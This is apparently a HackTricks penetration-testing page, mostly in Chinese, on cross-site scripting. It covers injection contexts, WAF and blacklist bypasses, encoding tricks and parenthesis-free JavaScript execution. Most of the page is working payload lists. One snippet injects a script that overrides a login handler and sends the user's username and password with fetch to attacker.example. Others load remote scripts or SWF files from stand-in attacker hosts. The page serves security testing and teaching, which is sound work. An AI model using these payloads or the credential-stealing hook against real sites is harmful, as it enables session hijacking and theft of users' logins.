# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## 方法论

1. 检查是否有 **任何你能控制的值**（_parameters_、_path_、_headers_？、_cookies_？）被**反射**到 HTML 中或被 **JS** 代码**使用**。
2. **找出被反射/使用的上下文**。
3. 如果是**反射型**
1. 检查 **你可以使用哪些符号**，并据此准备 payload：
1. 在 **raw HTML** 中：
1. 你能创建新的 HTML 标签吗？
2. 你能使用支持 `javascript:` 协议的事件或属性吗？
3. 你能绕过防护吗？
4. HTML 内容是否被任何客户端 JS 引擎（_AngularJS_、_VueJS_、_Mavo_...）解释，你可以滥用 [**Client Side Template Injection**](../client-side-template-injection-csti.md)。
5. 如果你不能创建执行 JS 的 HTML 标签，能否滥用 [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)？
2. 在 **HTML 标签内**：
1. 你能从属性中跳出并回到 raw HTML 上下文吗？
2. 你能创建新的事件/属性来执行 JS 吗？
3. 你被限制的属性是否支持执行 JS？
4. 你能绕过防护吗？
3. 在 **JavaScript 代码** 内：
1. 你能从 `<script>` 标签中逃逸吗？
2. 你能跳出字符串并执行不同的 JS 代码吗？
3. 你的输入是否在模板字面量 ```` 中？
4. 你能绕过防护吗？
4. 被**执行**的 Javascript **函数**
1. 你可以指定要执行的函数名。例如：`?callback=alert(1)`
4. 如果是**被使用**的：
1. 你可能会利用 **DOM XSS**，注意你的输入如何被控制，以及你的**可控输入**是否被任何 sink 使用。

在处理复杂的 XSS 时，你可能会对下面的内容感兴趣：


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## 被反射的值

要成功利用 XSS，首先需要找到一个**被你控制且被反射的值**在网页中。

- **中间反射**：如果你发现某个参数的值或路径在网页中被反射，你可能利用 **Reflected XSS**。
- **存储并反射**：如果你发现一个你能控制的值被保存在服务器上并在每次访问页面时被反射，你可能利用 **Stored XSS**。
- **通过 JS 访问**：如果你发现一个你能控制的值被 JS 访问，你可能利用 **DOM XSS**。

## 上下文

在尝试利用 XSS 时，首先要知道**你的输入被反射到哪里**。根据不同的上下文，你将能够以不同方式执行任意 JS 代码。

### Raw HTML

如果你的输入被**反射在 raw HTML** 页面上，你需要滥用一些 **HTML tag** 来执行 JS 代码：`<img , <iframe , <svg , <script` ... 这些只是你可以使用的众多 HTML 标签中的一部分。\
另外，记得考虑 [Client Side Template Injection](../client-side-template-injection-csti.md)。

### 在 HTML 标签属性内

如果你的输入被反射到标签属性的值里，你可以尝试：

1. **从属性和标签中跳出**（然后你将处于 raw HTML）并创建新的 HTML 标签来滥用：`"><img [...]`
2. 如果你**能跳出属性但不能跳出标签**（`>` 被编码或删除），视标签而定你可以**创建一个事件**来执行 JS：`" autofocus onfocus=alert(1) x="`
3. 如果你**不能跳出属性**（`"` 被编码或删除），那么取决于**你值被反射在哪个属性里**以及你是否能控制整个值或只是部分，你仍可能利用该属性。例如，如果你控制一个像 `onclick=` 的事件，你就能让它在被点击时执行任意代码。另一个有趣的例子是 `href` 属性，你可以使用 `javascript:` 协议来执行任意代码：**`href="javascript:alert(1)"`**
4. 如果你的输入被反射在“不可利用的标签”内，你可以尝试使用 **`accesskey`** 技巧来滥用该漏洞（这需要某种社会工程来触发）：**`" accesskey="x" onclick="alert(1)" x="`**

如果你能控制 class 名称，Angular 在某些情况下执行 XSS 的怪异示例：
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### 在 JavaScript 代码中

在这种情况下，你的输入会被反射到 HTML 页面中的 **`<script> [...] </script>`** 标签之间、`.js` 文件内，或使用 **`javascript:`** 协议的属性内：

- 如果被反射到 **`<script> [...] </script>`** 标签之间，即使你的输入在任意类型的引号内，你也可以尝试注入 `</script>` 来跳出该上下文。之所以可行，是因为 **浏览器会先解析 HTML 标签** 然后再解析内容，因此它不会注意到你注入的 `</script>` 标签位于 HTML 代码内部。
- 如果被反射到 **JS 字符串内部** 且上一个技巧不起作用，你需要**退出**字符串、**执行**你的代码并**重建**JS 代码（如果有任何错误，代码将不会被执行）：
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- 如果被反射到模板字面量内部，你可以使用 `${ ... }` 语法**嵌入 JS 表达式**： `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** 可用于编写 **valid javascript code**：
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting 指的是能够在使用后再**声明函数、变量或类，从而滥用那些 XSS 使用未声明变量或函数的情形。**\
**更多信息请参见以下页面：**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

许多网页的端点（endpoints）会**接受作为参数的要执行的函数名**。在实际中常见的例子为：`?callback=callbackFunc`。

判断用户直接提供的内容是否会被执行的一个好方法是**修改参数值**（例如改为 'Vulnerable'），并在控制台查看是否出现类似错误：

![](<../../images/image (711).png>)

如果存在漏洞，你可能只需发送值就能**触发 alert**：**`?callback=alert(1)`**。不过这些端点通常会**验证内容**，只允许字母、数字、点和下划线（**`[\w\._]`**）。

然而，即使有该限制，仍然可以执行某些操作。这是因为可以使用这些合法字符来**访问 DOM 中的任意元素**：

![](<../../images/image (747).png>)

一些有用的函数有：
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
你也可以尝试直接**触发 Javascript 函数**：`obj.sales.delOrders`。

然而，通常执行所指函数的端点是没有太多有趣 DOM 的端点，**同源的其他页面**会有一个**更有趣的 DOM**来执行更多操作。

因此，为了在**不同的 DOM 中滥用此漏洞**，开发了 **Same Origin Method Execution (SOME)** 利用方法：


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

存在**JS 代码**不安全地使用了一些**由攻击者控制的数据**，例如 `location.href`。攻击者可以滥用这一点来执行任意 JS 代码。


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

这类 XSS 可以出现在**任何地方**。它们不仅依赖于对 web 应用的客户端利用，还依赖于**任何****上下文**。这类**任意 JavaScript 执行**甚至可以被滥用以获取 **RCE**、在客户端和服务器上**读取任意文件**等更多能力。\
一些**示例**：


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

当你的输入被反射到**HTML 页面内部**，或者你可以在此上下文中转义并注入 HTML 代码时，**首先**需要做的是检查是否可以滥用 `<` 来创建新标签：只需尝试**反射**该**字符**并检查它是被**HTML 编码**、被**删除**，还是**原样反射**。**只有在最后一种情况你才能利用这个场景**。\
在这些情况下也**要记住**[**Client Side Template Injection**](../client-side-template-injection-csti.md)**。**\
_**注：HTML 注释可以使用 `-->` 或 `--!>` 关闭**_

在这种情况下，如果没有使用黑/白名单过滤，你可以使用类似的 payload：
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
但是，如果使用了标签/属性的黑/白名单，你需要 **暴力枚举可以创建的标签**。\
一旦你 **定位到哪些标签被允许**，你需要在这些已发现的有效标签内 **暴力枚举属性/事件**，以查看如何针对不同上下文发起攻击。

### 标签/事件 暴力枚举

Go to [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click on _**Copy tags to clipboard**_. Then, send all of them using Burp intruder and check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can **brute force all the events** using the valid tags (in the same web page click on _**Copy events to clipboard**_ and follow the same procedure as before).

### 自定义标签

如果你没找到任何有效的 HTML 标签，可以尝试 **创建自定义标签** 并用 `onfocus` 属性执行 JS 代码。在 XSS 请求中，需要在 URL 末尾加上 `#`，以使页面 **聚焦到该对象** 并 **执行** 代码：
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

如果正在使用某种 blacklist，你可以尝试用一些简单的技巧来 bypass 它：
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### 长度绕过（小型 XSS）

> [!NOTE] > **更多适用于不同环境的 tiny XSS payload** [**can be found here**](https://github.com/terjanq/Tiny-XSS-Payloads) and [**here**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
The last one is using 2 unicode characters which expands to 5: telsr\
更多此类字符可在[这里](https://www.unicode.org/charts/normalization)找到。\
要检查哪些字符被分解，请查看[这里](https://www.compart.com/en/unicode/U+2121)。

### Click XSS - Clickjacking

如果为了利用该漏洞你需要**用户点击带有预填数据的链接或表单**，你可以尝试[**abuse Clickjacking**](../clickjacking.md#xss-clickjacking)（如果页面存在该漏洞）。

### Impossible - Dangling Markup

如果你认为**不可能创建带有属性以执行 JS 代码的 HTML 标签**，你应该查看[**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html)，因为你可能在**不**执行**JS**代码的情况下**利用**该漏洞。

## Injecting inside HTML tag

### Inside the tag/escaping from attribute value

如果你处于**HTML 标签内部**，首先可以尝试从标签中**escape**，并使用[上一节](#injecting-inside-raw-html)中提到的一些技术来执行 JS 代码。\
如果你**无法从标签中 escape**，你可以在标签内创建新的属性来尝试执行 JS 代码，例如使用如下 payload（_note that in this example double quotes are use to escape from the attribute, you won't need them if your input is reflected directly inside the tag_）：
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**样式事件**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### 在属性内

即使你 **cannot escape from the attribute** (`"` is being encoded or deleted)，取决于你的值被反射到 **which attribute** 以及你是控制了整个值还是仅控制一部分，你仍然可以滥用它。 For **example**, if you control an event like `onclick=` you will be able to make it execute arbitrary code when it's clicked.\
另一个有趣的 **example** 是属性 `href`，你可以使用 `javascript:` 协议来执行任意代码：**`href="javascript:alert(1)"`**

**在事件内部通过 HTML 编码/URL 编码绕过**

HTML 标签属性值中的 **HTML encoded characters** 会在 **decoded on runtime**。因此像下面这样的写法将是有效的（payload 用粗体表示）： `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

注意，**any kind of HTML encode is valid**：
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**注意 URL encode 也有效：**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**在事件内部使用 Unicode 编码绕过**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### 属性内的特殊协议

你可以在某些位置使用协议 **`javascript:`** 或 **`data:`** 来 **执行任意 JS 代码**。有些需要用户交互，有些则不需要。
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**可以注入这些协议的地方**

**一般来说** `javascript:` 协议可以 **在任何接受属性 `href` 的标签中使用**，并且在 **大多数** 接受 **属性 `src`** 的标签中也可使用（但不能在 `\<img\>` 中）
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**其他混淆技巧**

_**在这种情况下，前一节中提到的 HTML encoding 和 Unicode encoding 技巧在属性内部也同样有效。**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
此外，对于这些情况还有一个**不错的技巧**：**即使你放在 `javascript:...` 里的输入被 URL 编码，执行前也会被 URL 解码。**

因此，如果你需要使用**单引号**从**字符串**中**跳出**，并且看到**它被 URL 编码**，记住**这无关紧要，**它会在**执行**时被**解释**为**单引号**。
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
注意，如果你尝试 **同时使用** `URLencode + HTMLencode` 以任意顺序对 **payload** 进行编码，它 **不会** **起作用**，但你可以 **在 payload 内混合使用它们**。

**使用 Hex 和 Octal encode 与 `javascript:`**

你可以在 `iframe` 的 `src` 属性中（至少）使用 **Hex** 和 **Octal encode** 来声明 **HTML tags to execute JS**：
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
如果你能在任意 **`<a href=`** 标签中注入任意 URL，且该标签包含 **`target="_blank" and rel="opener"`** 属性，请查看 **以下页面以利用此行为**：


{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### on 事件处理程序绕过

首先查看此页面 ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) 以获取有用的 **"on" 事件处理程序**。\
如果存在某种黑名单阻止你创建这些事件处理程序，可以尝试以下绕过方法：
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS 在 "Unexploitable tags" (hidden input, link, canonical, meta)

从 [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **现在可以通过以下方式滥用 hidden inputs：**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
并在 **meta tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
来自 [**here**](https://portswigger.net/research/xss-in-hidden-input-fields)：你可以执行一个 **XSS payload inside a hidden attribute**，前提是你能 **说服** **受害者** 按下 **键组合**。在 Firefox Windows/Linux 上，键组合是 **ALT+SHIFT+X**，在 OS X 上是 **CTRL+ALT+X**。你可以通过在 **access key attribute** 中使用不同的键来指定不同的键组合。下面是攻击向量：
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSS payload 将类似于： `" accesskey="x" onclick="alert(1)" x="`**

### 黑名单绕过

本节之前已经展示了使用不同编码的若干技巧。返回学习你可以在哪里使用：

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**针对 HTML 标签和属性的绕过**

阅读[ Blacklist Bypasses of the previous section](#blacklist-bypasses).

**针对 JavaScript 代码的绕过**

阅读 J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

如果你在网页的非常小的部分发现了 **XSS**，且需要某种交互（例如页脚的一个带有 onmouseover 的小链接），你可以尝试**修改该元素占据的空间**以最大化链接被触发的可能性。

例如，你可以在元素中添加如下样式： `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

但是，如果 WAF 过滤了 style 属性，你可以使用 CSS Styling Gadgets，例如如果你发现，例如

> .test {display:block; color: blue; width: 100%\}

和

> \#someid {top: 0; font-family: Tahoma;}

现在你可以修改我们的链接，使其变为如下形式

> \<a href="" id=someid class=test onclick=alert() a="">

这个技巧摘自 [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## 注入到 JavaScript 代码中

在这种情况下，你的输入会被反射到 `.js` 文件的 JS 代码内部，或位于 `<script>...</script>` 标签之间，或位于可以执行 JS 的 HTML 事件之间，或位于接受 `javascript:` 协议的属性之间。

### 逃逸 \<script> tag

如果你的代码被插入在 `<script> [...] var input = 'reflected data' [...] </script>` 中，你可以很容易**逃逸关闭 `<script>`** 标签：
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
请注意，在这个示例中我们**甚至都没有关闭单引号**。这是因为**HTML parsing is performed first by the browser**，这包括识别页面元素，包括脚本块。随后才会对 JavaScript 进行解析以理解并执行嵌入的脚本。

### JS 代码内部

如果 `<>` 被过滤，你仍然可以在你的输入**所在的位置****转义字符串**并**执行任意 JS**。重要的是要**修复 JS 语法**，因为如果有任何错误，JS 代码就不会被执行：
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

当用户输入落入被引号包裹的 JavaScript 字符串内（例如，server-side echo into an inline script）时，你可以终止该字符串、inject 代码，并修复语法以保持解析有效。通用骨架：
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
当存在漏洞的参数被反射到 JS 字符串中时的示例 URL 模式：
```
?param=test";<INJECTION>;a="
```
这会执行攻击者的 JS，而不需要接触 HTML context（纯 JS-in-JS）。当过滤器屏蔽关键词时，可与下面的 blacklist bypasses 结合使用。

### Template literals ``

除了使用单引号和双引号来构造字符串外，JS 也接受 **backticks** **` `` `** 来构造 **strings**。这就是所谓的 template literals，因为它们允许使用 `${ ... }` 语法来 **embedded JS expressions**。\
因此，如果你发现你的输入被 **reflected** 到使用 backticks 的 JS 字符串中，你可以利用 `${ ... }` 语法来执行 **arbitrary JS code**：

可以通过以下方式 **abused**：
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### 编码的代码执行
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### 带 eval(atob()) 的可交付 payloads 及作用域细微差别

为了缩短 URL 并绕过简单的关键字过滤，你可以将真实逻辑 base64-encode，然后用 `eval(atob('...'))` 执行。如果简单的关键字过滤阻止了像 `alert`、`eval` 或 `atob` 这样的标识符，使用 Unicode 转义的标识符，它们在浏览器中以相同方式编译但能规避字符串匹配过滤：
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
重要的作用域细节：在 `eval()` 内声明的 `const`/`let` 是块级作用域，不会创建全局变量；它们不会被后续脚本访问。需要时，使用动态注入的 `<script>` 元素来定义全局的、不可重新绑定的钩子（例如，用于劫持表单处理器）：
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
参考：https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Unicode 编码 JS 执行
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript bypass blacklists 技巧

**字符串**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**特殊转义**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**JS 代码中的空格替换**
```javascript
<TAB>
/**/
```
**JavaScript comments (摘自** [**JavaScript Comments**](#javascript-comments) **技巧)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (来自** [**JavaScript new line**](#javascript-new-lines) **技巧)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript 空白字符**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**注释内的 Javascript**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript 不使用括号**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**任意函数 (alert) 调用**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
